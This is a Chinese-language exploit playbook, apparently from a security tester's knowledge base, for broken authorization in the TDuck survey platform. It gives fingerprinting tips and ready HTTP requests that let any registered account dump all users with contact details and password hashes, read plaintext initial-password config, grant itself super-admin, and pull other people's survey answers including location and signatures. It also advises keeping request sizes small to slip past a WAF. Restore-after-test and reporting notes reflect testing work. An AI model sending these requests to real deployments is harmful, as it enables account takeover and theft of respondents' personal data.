# tduck问卷系统-任意登录全接口越权+超管

> 指纹：TDuck / 填鸭 tduck-pro 问卷系统，后端全部 `tduck-api` 系接口只验登录、功能级与对象级鉴权缺失，任意注册账号就是全接口权限 → 读全量用户/答卷、自提权超管。命中以下任一特征即开本文件。

## 一眼识别
- 后端 API 几乎都在 `/tduck-api/` 前缀；未登录访问业务口回 `{"code":401,...认证失败}`（旧版业务口未登录回 `code:23 请先登录`）
- 未登录 `GET /tduck-api/public/systemInfoConfig` 有回（项目信息 / 备案 / 底部配置；误配时含 `casServerUrl`/`webUrl` 等 localhost 内网残留）
- 登录后 `GET /tduck-api/getInfo` 返回 `roles` / `permissions` 数组；会话用 `authorization: eyJ...JWT`（HS512），登录态也存 `X-Admin-Token` cookie
- 前台本质是问卷/调查/填报平台（表单 key 叫 `formKey`，问卷编辑器、答卷统计），学校/评估/调研机构常用
- JS 前端线索：`tduck`、`formKey`、问卷编辑器组件特征；部署方常自行改造加功能，版本可漂

## 已验证 PoC
（占位：`<HOST>` 换目标；`<AUTH>` 换**任意注册账号**登录后抓包的 `authorization` 值；`<USER_ID>` 换该账号 userId；`<FORM_KEY>` 换任一他人问卷 key。本库不存实值。）任一报文去掉 `authorization` 头返回 401 即证明鉴权威助在头而不在角色。

### ① 探测接口层鉴权是否真空（核心判据枪）
```http
GET /tduck-api/system/user/page?pageNum=1&pageSize=1 HTTP/1.1
Host: <HOST>
Connection: close
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.9
Origin: https://<HOST>
Referer: https://<HOST>/
authorization: <AUTH>
```
**判据**：`code:200` 且 `total>0`（实测 821），rows 首条 admin、含**真实手机/邮箱/bcrypt 密码哈希** → 接口层无角色/权限点鉴权。换 path 同法打 `/system/role/list`（含超管角色 `roleKey=admin,id=1`）、`/system/config/list`（配置含初始密码明文 `sys.user.initPassword`）、`/monitor/job/list`、`/tool/gen/list`。

### ② 自提权超管（证明写接口也无鉴权；验完必还原）
```http
PUT /tduck-api/system/user/authRole?userId=<USER_ID>&roleIds=1 HTTP/1.1
Host: <HOST>
Connection: close
Content-Length: 0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.9
Origin: https://<HOST>
Referer: https://<HOST>/
authorization: <AUTH>
```
**判据**：`code:200`，随后 `GET /tduck-api/getInfo` 回包 `roles` 含 `admin`。**证明后立刻还原**：同报文 `roleIds=` 改回账号原默认角色再发一次。

### ③ 对象级越权读他人问卷 / 答卷
```http
GET /tduck-api/form/manage/page?current=1&size=2 HTTP/1.1
Host: <HOST>
Connection: close
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.9
Origin: https://<HOST>
Referer: https://<HOST>/
authorization: <AUTH>
```
判据：`total` 海量（实测 1091，全国各校问卷）→ 全平台问卷可枚举，取任一他人 `formKey`。

```http
GET /tduck-api/user/form/fields/<FORM_KEY> HTTP/1.1
Host: <HOST>
Connection: close
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.9
Origin: https://<HOST>
Referer: https://<HOST>/
authorization: <AUTH>
```
判据：读到**他人**问卷全量题目结构。

```http
POST /tduck-api/user/form/data/query HTTP/1.1
Host: <HOST>
Connection: close
Content-Type: application/json
Content-Length: <LEN>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.9
Origin: https://<HOST>
Referer: https://<HOST>/
authorization: <AUTH>

{"formKey":"<FORM_KEY>","current":1,"size":1}
```
判据：返回**他人**真实答卷明细（年级/性别/专业/逐题作答/openid；微信渠道侧重含位置/IP 与手写签名图），`total` 可翻页（实测 24163 一条）。→ 对象归属/数据级鉴权缺失。

## 替换点说明
| 占位 | 怎么拿 |
|------|--------|
| `<HOST>` | 目标问卷平台域名 |
| `<AUTH>` | 平台公开注册/任意账号登录，抓包取 `authorization` 头（JWT）；过期就重登换新 |
| `<USER_ID>` | 该账号 userId（登录回包 / 前端 JS 有） |
| `<FORM_KEY>` | ①③ 第一步枚举拿到任一他人问卷 key |
| `<LEN>` | body 实际字节数 |

## 最小伤害证明
- ①②③ 各打一枪证明"任意登录 = 全接口 + 对象越权"即可停：读列表/单条，不批量翻页拉全量、不下他人整套答卷、不触发导出。
- ② 提权到超管只为了证明写口也无鉴权，**证明完立即还原默认角色**；不做 resetPwd/给他人赋权/删除等破坏性写。
- 全程不真改密、不登出他人、不给目标留身份。

## 备注
- tduck 是开源问卷项目（tduck-pro），可对照源码精确定位 `/system`、`/monitor`、`/tool`、`/form/manage`、`/user/form/*` 各用户。部署方改版会造成 path 微调，识别仍看 `tduck-api` 前缀 + `formKey` + getInfo 结构。
- 未登录的统一 401/`code:23` 是"头带了就放行"的假鉴权壳，别被它劝退；重点打登录后的 `/system`、`/user/form` 系。
- 前置有 WAF（实测安恒 dbappwaf）时，size/current 别一次拉太大，避免触发拦截。
- 提交定级：读全量用户/答卷 = 高危（对得上人）；未断开登出/未真改密不妄报严重。